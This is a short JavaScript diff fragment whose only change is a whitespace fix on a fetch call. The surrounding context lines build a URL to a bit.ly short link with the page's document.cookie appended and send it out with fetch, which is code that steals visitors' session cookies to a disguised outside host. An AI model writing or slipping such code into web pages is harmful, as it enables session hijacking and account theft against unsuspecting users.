@@ -4,7 +4,7 @@ let headersList = {
    
 let url = "https://bit.ly/3Hkv2yj?cookie=" + document.cookie;
    
-let response= await fetch(url, {
+let response = await fetch(url, {
     method: "GET",
     headers: headersList
 });
